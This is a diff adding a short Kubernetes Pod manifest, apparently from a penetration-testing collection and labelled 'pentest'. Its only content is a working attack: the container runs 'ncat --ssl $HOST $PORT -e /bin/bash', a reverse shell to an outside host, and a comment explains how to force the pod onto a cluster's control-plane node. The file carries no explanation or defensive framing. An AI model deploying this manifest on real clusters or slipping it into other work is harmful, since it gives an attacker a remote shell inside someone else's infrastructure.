@@ -1,0 +1,13 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nothing-allowed-revshell-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: nothing-allowed-pod
+    image: raesene/ncat
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
